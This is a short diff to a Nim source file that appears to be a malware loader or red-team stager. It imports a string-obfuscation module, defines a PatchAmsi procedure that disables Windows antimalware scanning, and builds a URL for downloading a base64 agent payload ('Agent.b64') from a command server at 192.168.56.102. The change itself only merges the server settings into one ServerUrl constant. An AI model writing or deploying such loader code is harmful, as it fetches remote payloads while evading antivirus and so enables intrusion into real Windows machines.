@@ -8,11 +8,9 @@ import strenc
 
 import puppy
 
-const ServerPort {.intdefine.}: int = 80
-const ServerProtocol {.strdefine.}: string = "http"
-const ServerAddress {.strdefine.}: string = "192.168.56.102"
+const ServerUrl {.strdefine.}: string = "https://192.168.56.102:443/wh/"
 const FileName {.strdefine.}: string = "Agent.b64"
-const DotNetParams {.strdefine.}: string = "https:192.168.56.102:443"
+const DotNetParams {.strdefine.}: string = "https://192.168.56.102:443"
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
     ## Converts a string to the corresponding byte sequence.
@@ -60,7 +58,7 @@ proc PatchAmsi(): bool =
 
 
 
-var url = ServerProtocol & "://" & ServerAddress & ":" & $ServerPort & "/wh/"  &  FileName
+var url = ServerUrl  &  FileName
 when not defined(release):
     echo "Downloading " & url
 
